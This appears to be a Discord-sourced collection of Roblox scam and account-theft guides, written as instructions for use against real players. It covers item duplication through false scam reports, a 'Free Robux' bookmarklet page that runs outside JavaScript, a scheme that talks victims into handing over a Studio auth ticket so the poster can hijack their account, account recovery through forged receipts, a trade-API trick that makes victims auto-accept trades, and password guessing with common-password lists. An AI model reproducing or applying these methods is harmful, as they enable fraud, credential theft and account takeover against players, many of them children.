@@ -1,0 +1,176 @@
+Dupe Adopt Me Method
+
+1) Trade all of your pets to an alt account and tell Adopt Me you were scammed.
+
+2) On your alt account, trade your pets for other pets and trade the new pets to two different alt accounts.
+
+3) Send the new pets to your account that was "scammed" and your Adopt Me pets should be duplicated.
+Adopt Me Method 1
+
+1) Create an ad in Marketplace servers, saying that you're selling Adopt Me pets.
+
+2) Sell the pets and use a middleman.
+
+3) Request your pets back from Adopt Me using the Trade License and use the trade where you gave the user the pets as proof.
+	
+Bookmark method
+
+1) Go to sites.google.com, create a new site, click html, and click the second option, and paste the code below.
+
+2) Change Javascript link here to your javascript link. Feel free to change other visual attributes about the site.
+
+<html>
+<head>
+<style>
+a:link, a:visited {
+  background-color: #f44336;
+  color: white;
+  padding: 15px 25px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+}
+
+a:hover, a:active {
+  background-color: red;
+}
+</style>
+</head>
+<body>
+
+<h2>Drag button to your bookmarks</h2>
+<a href="Javascript link here" target="_blank">Free Robux</a>
+</body>
+</html>
+
+go to https://creed22.xyz/create1 for a javascript so you can use this method. the javascript here will edit the robux amount to any number.
+go to https://rblx0.xyz/booky for a pre-made bookmark method if you dont want to make one yourself
+I recommend making one on ixware because you can create your own prompt but the site is down at the moment so I listed alternatives.
+o I see a lot of people selling this method, it really is an old method its just a bit different as before. This is the studio method but you do something else with the code you receive. I will explain step by step what to do so enjoy. Step 1. Approach Usually i approach the victim by stating I will pay them limiteds, or something they'd like if they help me in studio. They say yes , get their discord, if they say no kindly walk off and do not push them because it will make it more sus then it already is Step 2. On discord When u get them on discord you will want to hop in a VC with them to make it easier and have them screenshare. Then , add them to a team create of some game you're 'developing' and have them go to the game page of that. Make them go in Inspect element on their brwoser, and click the "network" tab. Then, have them press the three dots and press edit. This prompt will appear, and if not i will show you how to get it to pop up. https://gyazo.com/acb8fc1892736e3afdf5ebee0bc9d8f2 f it doesnt, on chrome go to your history, click clear browsing data, and click Clear cookies. this wills ign u out of everything, but then the prompt will show. Anyways. Once it shows up, have them click cancel. On the network tab they opened earlier in inspect element, there will be a red text that says roblox-studio Have them right click that and click copy link address. Make up some bs story abou thow its a studio code, so you can report them to roblox incase they grief, or something malicious. make them send to you on discord, you will get a code that looks like this: roblox-studio:1+launchmode:edit+gameinfo:0DBAxxx69F8709BFEC1D04E80FxxE431A83F2348D2CD2C9BC63055E05F84747B447CA239DC486B0209F511086B974326E52B94+launchtime:1596346423464+task:EditPlace+placeId:5349120278+universeId:1874017863+avatar+browsertrackerid:58478116959+robloxLocale:en_us+gameLocale:en_us
+Gyazo
+Gyazo
+
+Step 3. Completion Then, they have fell for it. Now you must complete the scam. Pick a browser any browser, make sure your signed out of roblox. Go to the roblox auth page: https://auth.roblox.com/docs#!/Authentic...ket_redeem Click the yellow box as i show here: https://gyazo.com/d07ba86c54e36ce5b75b338c4c12ec51 This will fill the white box with the exact same code. Then in the white box, where you see "string" you will want to replace it with the text between gameinfo: and +launchtime So, for the example code I gave you, it will be 0DBAxxx69F8709BFEC1D04E80FxxE431A83F2348D2CD2C9BC63055E05F84747B447CA239DC486B0209F511086B974326E52B94 Then, on RBXAuthenticationnegotiation right below the white box, put https://roblox.com/ Press "try it out" And you should be in their account. Remember you only will be signed in their account on the browser you did the steps on, and you MUST BE SIGNED OUT OF ROBLOX or else it will invalidate the code and you will need to get it again which can be suspicious. Thanks for reading and enjoy before roblox patches this i just cant stand watching people sell this method even though its already known If I explained poorly Comment and ill assist as I can.
+Gyazo
+Gyazo
+
+ROBLOX
+Roblox
+Roblox is ushering in the next generation of entertainment. Imagine, create, and play together with millions of players across an infinite variety of immersive, user-generated 3D worlds.
+
+1.) Go to rbxflip.com and find a victim you're gonna comp. (Note: make sure the person your comping made his account between november to october. 2020
+Find out the date in which the account he made was created (Most alts for flip buy premium the day they make the account.)
+
+2.) Once u verified that the guy bought premium on that day go to roblox.com/support and fill out a form that your account has been hacked.
+Roblox should respond in a day but that should be enough time to follow through with it.
+
+3.) Roblox should ask for the first reciept added on the account, Following through just inspect element the day the account was made and respond with the reciept.
+Roblox will then go through the reciept and see that its the right date. and should revert the email of the account.
+
+-------------------------------------------------------------------------------------------------------------
+Rolimons method coming soon
+Just not at home rn
+Should be up in 2 days
+Vouch for me, in discord.gg/comp | Or I’ll kick you from this server
+! Ghost01/17/2021
+.har
+
+
+
+! Ghost01/18/2021
+1.) Go to rbxflip.com and find a victim you're gonna comp. (Note: make sure the person your comping made his account between last month and this month
+Find out the date in which the account he made was created (Most alts for flip buy premium the day they make the account.)
+
+2.) Once u verified that the guy bought premium on that day go to roblox.com/support and fill out a form that your account has been hacked.
+Roblox should respond in a day but that should be enough time to follow through with it.
+
+3.) Roblox should ask for the first reciept added on the account, Following through just inspect element the day the account was made and respond with the reciept.
+Roblox will then go through the reciept and see that its the right date. and should revert the email of the account.
+
+----------------------------------------------------------------------------------
+! Ghost01/18/2021
+Btw when taking limiteds, what u wanna do is use a alt, trade the stolen items for non stolen items, then put them on ur main or sell.
+! Ghost01/18/2021
+Fixed API method (Trade API method) 
+
+1. You find someone, in trade hangout or something and add them on discord. After doing that you send them a trade (for example, all their items for you small). 
+
+2. Head to https://trades.roblox.com/v1/trades/Outbound?sortOrder=Asc&limit=100 and get the outbound trade ID.
+
+3. Tell the user you sent the trade, to go to https://trades.roblox.com/docs#!/Trades/post_v1_trades_tradeId_accept and paste the outbound trade ID from step 2,  in "trade ID" on the second link. This will make the user auto accept the trade
+! Ghost01/18/2021
+People are having issues so if u are too, when I get home I’ll investigate this method
+! Ghost01/20/2021
+| Old Account PG Guide |
+
+
+If you follow these steps you should be able to PG most 06-08 accounts! Good luck!
+
+1. Find your victom, make sure their last logon date is not in 2012-2015, they have more then likely been PGed
+
+2. Go to the login in screen and enter their username
+
+3. Start guessing the password.
+
+4. Start with Username123 or 123Username or qwerty, password, hockey, football, password123 (More passwords at the bottom)
+
+5. Hopefully you manage to PG an account!
+
+Remember: Patience is the key, if you don't get it after 20 - 30 times just quit on the account.
+
+
+123456 
+password
+12345
+12345678
+qwerty
+123456789 
+1234
+baseball
+dragon
+football
+1234567
+monkey
+letmein
+abc123
+111111
+mustang
+access
+shadow
+master
+michael
+superman 
+696969
+123123 
+batman 
+trustno1
+
+Top passwords in 2006 VV
+
+password1
+abc123
+myspace1
+password
+blink182
+qwerty1
+fuckyou
+123abc
+baseball1
+football1
+123456
+soccer
+monkey1 
+liverpool1
+princess1
+jordan23
+slipknot1
+superman1
+iloveyou1 
+monkey
+
+
+
+Sorry for the repeats These are copied and pasted off of multiple sites
+
+
+Thank you for boosting my server, remember to vouch!
